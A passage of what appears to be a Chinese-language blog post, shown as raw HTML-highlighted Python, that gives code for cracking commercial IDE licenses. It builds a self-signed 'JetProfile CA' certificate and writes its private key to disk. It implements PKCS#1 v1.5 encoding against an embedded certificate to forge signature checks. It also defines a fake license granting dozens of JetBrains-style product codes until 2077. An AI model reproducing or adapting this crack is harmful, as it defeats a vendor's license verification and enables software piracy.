&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; x509&lt;span style="color:#f92672"&gt;.&lt;/span&gt;NameAttribute(NameOID&lt;span style="color:#f92672"&gt;.&lt;/span&gt;COMMON_NAME, &lt;span style="color:#e6db74"&gt;&amp;#39;MoYuno-from-2022-07-25&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;]))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;builder &lt;span style="color:#f92672"&gt;=&lt;/span&gt; builder&lt;span style="color:#f92672"&gt;.&lt;/span&gt;issuer_name(x509&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Name([
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; x509&lt;span style="color:#f92672"&gt;.&lt;/span&gt;NameAttribute(NameOID&lt;span style="color:#f92672"&gt;.&lt;/span&gt;COMMON_NAME, &lt;span style="color:#e6db74"&gt;&amp;#39;JetProfile CA&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;]))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;builder &lt;span style="color:#f92672"&gt;=&lt;/span&gt; builder&lt;span style="color:#f92672"&gt;.&lt;/span&gt;not_valid_before(yesterday)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;builder &lt;span style="color:#f92672"&gt;=&lt;/span&gt; builder&lt;span style="color:#f92672"&gt;.&lt;/span&gt;not_valid_after(tomorrow)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;builder &lt;span style="color:#f92672"&gt;=&lt;/span&gt; builder&lt;span style="color:#f92672"&gt;.&lt;/span&gt;serial_number(x509&lt;span style="color:#f92672"&gt;.&lt;/span&gt;random_serial_number())
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;builder &lt;span style="color:#f92672"&gt;=&lt;/span&gt; builder&lt;span style="color:#f92672"&gt;.&lt;/span&gt;public_key(public_key)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;certificate &lt;span style="color:#f92672"&gt;=&lt;/span&gt; builder&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sign(
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; private_key&lt;span style="color:#f92672"&gt;=&lt;/span&gt;private_key, algorithm&lt;span style="color:#f92672"&gt;=&lt;/span&gt;hashes&lt;span style="color:#f92672"&gt;.&lt;/span&gt;SHA256(),
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; backend&lt;span style="color:#f92672"&gt;=&lt;/span&gt;default_backend()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;private_bytes &lt;span style="color:#f92672"&gt;=&lt;/span&gt; private_key&lt;span style="color:#f92672"&gt;.&lt;/span&gt;private_bytes(
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; encoding&lt;span style="color:#f92672"&gt;=&lt;/span&gt;serialization&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Encoding&lt;span style="color:#f92672"&gt;.&lt;/span&gt;PEM,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; format&lt;span style="color:#f92672"&gt;=&lt;/span&gt;serialization&lt;span style="color:#f92672"&gt;.&lt;/span&gt;PrivateFormat&lt;span style="color:#f92672"&gt;.&lt;/span&gt;TraditionalOpenSSL,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; encryption_algorithm&lt;span style="color:#f92672"&gt;=&lt;/span&gt;serialization&lt;span style="color:#f92672"&gt;.&lt;/span&gt;NoEncryption())
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;public_bytes &lt;span style="color:#f92672"&gt;=&lt;/span&gt; certificate&lt;span style="color:#f92672"&gt;.&lt;/span&gt;public_bytes(
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; encoding&lt;span style="color:#f92672"&gt;=&lt;/span&gt;serialization&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Encoding&lt;span style="color:#f92672"&gt;.&lt;/span&gt;PEM)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;with&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#34;ca.key&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;wb&amp;#34;&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; fout:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; fout&lt;span style="color:#f92672"&gt;.&lt;/span&gt;write(private_bytes)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;with&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#34;ca.crt&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;wb&amp;#34;&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; fout:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; fout&lt;span style="color:#f92672"&gt;.&lt;/span&gt;write(public_bytes)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还有一个生成 key 和伪造验签&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-py" data-lang="py"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; base64
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; Crypto.Hash &lt;span style="color:#f92672"&gt;import&lt;/span&gt; SHA1, SHA256
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; Crypto.PublicKey &lt;span style="color:#f92672"&gt;import&lt;/span&gt; RSA
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; Crypto.Signature &lt;span style="color:#f92672"&gt;import&lt;/span&gt; pkcs1_15
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; Crypto.Util.asn1 &lt;span style="color:#f92672"&gt;import&lt;/span&gt; DerSequence, DerObjectId, DerNull, DerOctetString
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; Crypto.Util.number &lt;span style="color:#f92672"&gt;import&lt;/span&gt; ceil_div
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; cryptography &lt;span style="color:#f92672"&gt;import&lt;/span&gt; x509
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; cryptography.hazmat.primitives &lt;span style="color:#f92672"&gt;import&lt;/span&gt; hashes
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; cryptography.hazmat.primitives.asymmetric &lt;span style="color:#f92672"&gt;import&lt;/span&gt; padding
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# noinspection PyTypeChecker&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;pkcs15_encode&lt;/span&gt;(msg_hash, emLen, with_hash_parameters&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; Implement the ``EMSA-PKCS1-V1_5-ENCODE`` function, as defined
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :param msg_hash: hash object
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :param emLen: int
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :param with_hash_parameters: bool
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :return: An ``emLen`` byte long string that encodes the hash.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; digestAlgo &lt;span style="color:#f92672"&gt;=&lt;/span&gt; DerSequence([DerObjectId(msg_hash&lt;span style="color:#f92672"&gt;.&lt;/span&gt;oid)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode()])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; with_hash_parameters:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; digestAlgo&lt;span style="color:#f92672"&gt;.&lt;/span&gt;append(DerNull()&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode())
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; digest &lt;span style="color:#f92672"&gt;=&lt;/span&gt; DerOctetString(msg_hash&lt;span style="color:#f92672"&gt;.&lt;/span&gt;digest())
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; digestInfo &lt;span style="color:#f92672"&gt;=&lt;/span&gt; DerSequence([
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; digestAlgo&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode(),
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; digest&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ])&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# We need at least 11 bytes for the remaining data: 3 fixed bytes and&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# at least 8 bytes of padding).&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; emLen &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; len(digestInfo) &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;11&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;raise&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;TypeError&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;Selected hash algorithm has a too long digest (&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%d&lt;/span&gt;&lt;span style="color:#e6db74"&gt; bytes).&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; len(digest))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; PS &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\xFF&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;*&lt;/span&gt; (emLen &lt;span style="color:#f92672"&gt;-&lt;/span&gt; len(digestInfo) &lt;span style="color:#f92672"&gt;-&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\x00\x01&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; PS &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\x00&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; digestInfo
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;certBase64 &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;MIIFTDCCAzSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIyMDcyNTIzMTcwOVoXDTMyMDcyMzIzMTcwOVowHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDDx3gz77KvezmZJhwkF/10Q3vESk96tK6wJ00CSKkLybRDeQVOlHX3QAnPL7BjwCTzHqErsuyPuiZ6YTAVE/n7hLhIbh3lC+EBbxpa2hpIdIvUimr70iSrH9ZBWmnn5Fxy4r/r0tbxr34zpQzu4uWLiEqmOiDfRN+Zzj9FBaJ/gKsuhF7zNAbFHsClYntim5furDRITBra28nu0hfQIEBSHGPS2EKWTbKk2ifBLzMEDp99zIGEe/hrLpgBhdwGVD7VJsoeTXnvcgpt+91kiM918GWThO1L3eKU6W2mGZQv1bRyps7Fo61NElNWtJqqZ3KKyxJGyR1QpdOHd9flAesvYwb/lvc4uqYiKqwvvn+4iHPQlLtZDbzj0ICbKtVKSWgSprh0T5ZQGGNWXN4OMHtg9EuXvbagLshTEDkLKLzEBqSNpNmMmyzwyNO9/voQmHLjiWLdjVIYndjl15G+A9Dw5mVYqzKPMLEpHzg6ldkKJkGAxNBhCMUsmbEypT6r7wsdTvgEwFnP8ToOsAb12lSLxoR2bOT3xJ3WIfbyjvlBnauXfdu6SFF/82QFrLtQyddPvCHEiJTI0NmSYhjQObFohXMVVoXjGbXvuqgJNbc5UK06pCGQ2jKw4j6k1kw2g4fEYBd1fvEzb1/t+izpP8dEI0365xh0C1dpQjUj3uyRywIDAQABo4GZMIGWMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwCQYDVR0TBAIwADATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwHQYDVR0OBBYEFCTaESKW9YVBwJNH6DEjTPTAhAL/MA0GCSqGSIb3DQEBCwUAA4ICAQA29wUDKatiQe1S0qfId+1dRWnYznrHE0Cx41HUaeI5hvdZrFbDIP6syb/S9oAXST6w4pfgh80jk1xVL+B7NT5kFC+AI7mpd8dK8Z+K67tagYg41TdLGfSHqK+lljln5ElqUEN21fba5CVZplE286jy973XFOFbWZUpJC/5onCCAh8pK8AqpN7k3ovR6bfAga41UWdTnGeiyw9+XOj30ryebseTKaDfjQxsxEmyuA8YYCu9lgb58cvVrvc99So8KdOBaxHnxeEfiUqvPA8Y0QG7lc5elZYQ6cbiIqqsb/k9XSgB2Gk4CjuacBSxCAfd06NlJvZSDFSR1HTKhQfPLIQY1OpBC+NrKRWnQT4/IORL6F36gI9lTK+ioX8mzQ2bvXn4sXA3jrpRnGM2WemQvMPvstfSDKfcUdKjwX3rZ2jMwREkx/thtF3Huvsc8suOyzto1faD8mV0m4guq85fb4c9ki6cinz3QM2k6otVvh67gK116RZ7I8P/urTWvK7IOdwOE7UVqtpEe6TKvNhr1rzeaxUMdPcD0kY7fhBpuPwEQA+Xk0uiVR+XbpaPD4HWuapJm+31jC7zBp/BamRI25v26P5qMUQF/+P7eE4Ah/X0Rtf2Qvr2+p9kbfqalT8EiqOsvRiTvlMG1hdo33JdcwsxC05BWvZ++7Af0FgJ3TtFlw==&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cert &lt;span style="color:#f92672"&gt;=&lt;/span&gt; x509&lt;span style="color:#f92672"&gt;.&lt;/span&gt;load_der_x509_certificate(base64&lt;span style="color:#f92672"&gt;.&lt;/span&gt;b64decode(certBase64))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;public_key &lt;span style="color:#f92672"&gt;=&lt;/span&gt; cert&lt;span style="color:#f92672"&gt;.&lt;/span&gt;public_key()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sign &lt;span style="color:#f92672"&gt;=&lt;/span&gt; int&lt;span style="color:#f92672"&gt;.&lt;/span&gt;from_bytes(cert&lt;span style="color:#f92672"&gt;.&lt;/span&gt;signature, byteorder&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;big&amp;#34;&lt;/span&gt;, )
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(&lt;span style="color:#e6db74"&gt;f&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;sign:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;sign&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;modBits &lt;span style="color:#f92672"&gt;=&lt;/span&gt; public_key&lt;span style="color:#f92672"&gt;.&lt;/span&gt;key_size
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;digest_cert &lt;span style="color:#f92672"&gt;=&lt;/span&gt; SHA256&lt;span style="color:#f92672"&gt;.&lt;/span&gt;new(cert&lt;span style="color:#f92672"&gt;.&lt;/span&gt;tbs_certificate_bytes)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;r &lt;span style="color:#f92672"&gt;=&lt;/span&gt; int&lt;span style="color:#f92672"&gt;.&lt;/span&gt;from_bytes(pkcs15_encode(digest_cert, ceil_div(modBits, &lt;span style="color:#ae81ff"&gt;8&lt;/span&gt;)), byteorder&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;big&amp;#39;&lt;/span&gt;, signed&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(&lt;span style="color:#e6db74"&gt;f&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;result:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;r&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;licenseId &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;R7FP0YWA38&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;licensePart &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;{&amp;#34;licenseId&amp;#34;:&amp;#34;R7FP0YWA38&amp;#34;,&amp;#34;licenseeName&amp;#34;:&amp;#34;Braindance&amp;#34;,&amp;#34;assigneeName&amp;#34;:&amp;#34;&amp;#34;,&amp;#34;assigneeEmail&amp;#34;:&amp;#34;&amp;#34;,&amp;#34;licenseRestriction&amp;#34;:&amp;#34;&amp;#34;,&amp;#34;checkConcurrentUse&amp;#34;:false,&amp;#34;products&amp;#34;:[{&amp;#34;code&amp;#34;:&amp;#34;DPN&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;DB&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;PS&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;II&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;RSC&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:true},{&amp;#34;code&amp;#34;:&amp;#34;GO&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;DM&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;RSF&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:true},{&amp;#34;code&amp;#34;:&amp;#34;DS&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;PC&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;RC&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;CL&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;WS&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;RD&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;RS0&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;RM&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;AC&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;RSV&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:true},{&amp;#34;code&amp;#34;:&amp;#34;DC&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;RSU&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:false},{&amp;#34;code&amp;#34;:&amp;#34;DP&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:true},{&amp;#34;code&amp;#34;:&amp;#34;PDB&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:true},{&amp;#34;code&amp;#34;:&amp;#34;PWS&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:true},{&amp;#34;code&amp;#34;:&amp;#34;PSI&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:true},{&amp;#34;code&amp;#34;:&amp;#34;PPS&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:true},{&amp;#34;code&amp;#34;:&amp;#34;PCWMP&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:true},{&amp;#34;code&amp;#34;:&amp;#34;PGO&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:true},{&amp;#34;code&amp;#34;:&amp;#34;PPC&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:true},{&amp;#34;code&amp;#34;:&amp;#34;PRB&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:true},{&amp;#34;code&amp;#34;:&amp;#34;PSW&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:true},{&amp;#34;code&amp;#34;:&amp;#34;RS&amp;#34;,&amp;#34;paidUpTo&amp;#34;:&amp;#34;2077-01-01&amp;#34;,&amp;#34;extended&amp;#34;:true}],&amp;#34;metadata&amp;#34;:&amp;#34;0120211210PPAM000005&amp;#34;,&amp;#34;hash&amp;#34;:&amp;#34;28822622/0:1202205338&amp;#34;,&amp;#34;gracePeriodDays&amp;#34;:7,&amp;#34;autoProlongated&amp;#34;:false,&amp;#34;isAutoProlongated&amp;#34;:false}&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
